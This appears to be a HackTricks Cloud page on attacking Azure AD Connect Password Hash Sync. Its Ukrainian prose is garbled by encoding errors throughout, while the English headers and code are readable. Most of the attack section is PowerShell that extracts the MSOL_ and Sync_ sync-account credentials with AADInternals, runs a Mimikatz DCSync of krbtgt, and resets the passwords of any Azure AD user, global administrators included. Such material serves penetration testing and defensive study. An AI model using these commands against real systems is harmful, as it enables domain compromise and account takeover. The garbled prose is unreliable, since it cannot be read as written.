# Az - PHS - Password Hash Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **–°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è —Ö–µ—à—ñ–≤ –ø–∞—Ä–æ–ª—ñ–≤** —î –æ–¥–Ω–∏–º —ñ–∑ –º–µ—Ç–æ–¥—ñ–≤ –≤—Ö–æ–¥—É, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è –≥—ñ–±—Ä–∏–¥–Ω–æ—ó —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ. **Azure AD Connect** —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—î —Ö–µ—à, —Ö–µ—à—É, –ø–∞—Ä–æ–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –ª–æ–∫–∞–ª—å–Ω–æ—ó —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó Active Directory –¥–æ —Ö–º–∞—Ä–Ω–æ—ó —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó Azure AD.

<figure><img src="../../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

–¶–µ **–Ω–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à–∏–π –º–µ—Ç–æ–¥**, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –∫–æ–º–ø–∞–Ω—ñ—ó –¥–ª—è —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ AD –∑ Azure AD.

–í—Å—ñ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** —Ç–∞ **—Ö–µ—à –ø–∞—Ä–æ–ª—ñ–≤** —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—é—Ç—å—Å—è –∑ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ AD –¥–æ Azure AD. –û–¥–Ω–∞–∫ **–ø–∞—Ä–æ–ª—ñ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ** –∞–±–æ **–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ** **—Ö–µ—à—ñ** –Ω–µ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –¥–æ Azure AD.\
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, **–≤–±—É–¥–æ–≤–∞–Ω—ñ** –≥—Ä—É–ø–∏ –±–µ–∑–ø–µ–∫–∏ (—è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –¥–æ–º–µ–Ω—É...) **–Ω–µ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—é—Ç—å—Å—è** –∑ Azure AD.

**–°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è —Ö–µ—à—ñ–≤** –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –∫–æ–∂–Ω—ñ **2 —Ö–≤–∏–ª–∏–Ω–∏**. –û–¥–Ω–∞–∫ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º **—Ç–µ—Ä–º—ñ–Ω–∏ –¥—ñ—ó –ø–∞—Ä–æ–ª—ñ–≤** —Ç–∞ **—Ç–µ—Ä–º—ñ–Ω–∏ –¥—ñ—ó –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤** **–Ω–µ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—é—Ç—å—Å—è** –≤ Azure AD. –¢–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —á–∏–π **–ª–æ–∫–∞–ª—å–Ω–∏–π –ø–∞—Ä–æ–ª—å –ø—Ä–æ—Å—Ç—Ä–æ—á–µ–Ω–∏–π** (–Ω–µ –∑–º—ñ–Ω–µ–Ω–∏–π), –º–æ–∂–µ –ø—Ä–æ–¥–æ–≤–∂—É–≤–∞—Ç–∏ **–¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ Azure** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å—Ç–∞—Ä–æ–≥–æ –ø–∞—Ä–æ–ª—è.

–ö–æ–ª–∏ –ª–æ–∫–∞–ª—å–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ö–æ—á–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—Å—É—Ä—Å—É Azure, **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –≤ Azure AD**.

**PHS** –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–ª—è —Ñ—É–Ω–∫—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ **–ó–∞—Ö–∏—Å—Ç —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ** —Ç–∞ AAD Domain Services.

## Pivoting

–ö–æ–ª–∏ PHS –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ, –¥–µ—è–∫—ñ **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏** –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ **—Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è**:

* –û–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å **`MSOL_<installationID>`** –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –≤ –ª–æ–∫–∞–ª—å–Ω–æ–º—É AD. –¶—å–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É –Ω–∞–¥–∞—î—Ç—å—Å—è —Ä–æ–ª—å **–û–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –∫–∞—Ç–∞–ª–æ–≥—É** (–¥–∏–≤. [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—é](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)), —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤—ñ–Ω –º–∞—î **–¥–æ–∑–≤–æ–ª–∏ –Ω–∞ —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—é (DCSync) –≤ –ª–æ–∫–∞–ª—å–Ω–æ–º—É AD**.
* –û–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å **`Sync_<name of on-prem ADConnect Server>_installationID`** —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –≤ Azure AD. –¶–µ–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –º–æ–∂–µ **—Å–∫–∏–¥–∞—Ç–∏ –ø–∞—Ä–æ–ª—å –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** (—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω–æ–≥–æ –∞–±–æ –ª–∏—à–µ –≤ —Ö–º–∞—Ä—ñ) –≤ Azure AD.

–ü–∞—Ä–æ–ª—ñ –¥–≤–æ—Ö –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ **–∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ SQL —Å–µ—Ä–≤–µ—Ä—ñ** –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ, –¥–µ **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ Azure AD Connect.** –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –≤–∏—Ç—è–≥—É–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ —Ü–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ.\
–ë–∞–∑–∞ –¥–∞–Ω–∏—Ö —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∞ –∑–∞ –∞–¥—Ä–µ—Å–æ—é `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

–ú–æ–∂–ª–∏–≤–æ –≤–∏—Ç—è–≥—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∑ –æ–¥–Ω—ñ—î—ó –∑ —Ç–∞–±–ª–∏—Ü—å, –æ–¥–Ω–∞ –∑ —è–∫–∏—Ö –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∞:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**–ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è** –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **DPAPI** —ñ –º—ñ—Å—Ç–∏—Ç—å **–ø–∞—Ä–æ–ª—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ `MSOL_*`** –≤ –ª–æ–∫–∞–ª—å–Ω–æ–º—É AD —Ç–∞ –ø–∞—Ä–æ–ª—å **Sync\_\*** –≤ AzureAD. –¢–æ–º—É, –∫–æ–º–ø—Ä–æ–º–µ—Ç—É—é—á–∏ —Ü—ñ –¥–∞–Ω—ñ, –º–æ–∂–Ω–∞ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –¥–æ AD —Ç–∞ AzureAD.

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [–ø–æ–≤–Ω–∏–π –æ–≥–ª—è–¥ —Ç–æ–≥–æ, —è–∫ —Ü—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è —Ç–∞ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É—é—Ç—å—Å—è –≤ —Ü—ñ–π –¥–æ–ø–æ–≤—ñ–¥—ñ](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Finding the **Azure AD connect server**

–Ø–∫—â–æ **—Å–µ—Ä–≤–µ—Ä, –Ω–∞ —è–∫–æ–º—É –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ Azure AD connect**, –ø—Ä–∏—î–¥–Ω–∞–Ω–∏–π –¥–æ –¥–æ–º–µ–Ω—É (—Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó), –π–æ–≥–æ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è MSOL\_\*
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ü–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö.
{% endhint %}

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è Sync\_\*

–ö–æ–º–ø—Ä–æ–º–µ—Ç—É—é—á–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å **`Sync_*`**, –º–æ–∂–ª–∏–≤–æ **—Å–∫–∏–Ω—É—Ç–∏ –ø–∞—Ä–æ–ª—å** –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–≤–∫–ª—é—á–∞—é—á–∏ –≥–ª–æ–±–∞–ª—å–Ω–∏—Ö –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤)
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ **–∑–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—ñ –ª–∏—à–µ –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ö–º–∞—Ä–∏** (–Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Ü–µ –Ω–µ–æ—á—ñ–∫—É–≤–∞–Ω–æ)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
–¶—ñ–ª–∫–æ–º –º–æ–∂–ª–∏–≤–æ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø–∞—Ä–æ–ª—å —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.

{% hint style="danger" %}
–Ü–Ω—à–æ—é –æ–ø—Ü—ñ—î—é –±—É–ª–æ –± **–ø—Ä–∏–∑–Ω–∞—á–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ —Å–ª—É–∂–±–æ–≤–æ–º—É –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É**, —â–æ **Sync** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î **–¥–æ–∑–≤–æ–ª–∏** –Ω–∞ —Ü–µ, –∞ –ø–æ—Ç—ñ–º **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ü—å–æ–≥–æ —Å–ª—É–∂–±–æ–≤–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É** —è–∫ —Å–ø–æ—Å—ñ–± –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
{% endhint %}

### –ë–µ–∑—à–æ–≤–Ω–∏–π SSO

–ú–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±–µ–∑—à–æ–≤–Ω–∏–π SSO –∑ PHS, —è–∫–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ —ñ–Ω—à–∏—Ö –∑–ª–æ–≤–∂–∏–≤–∞–Ω—å. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ –≤:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
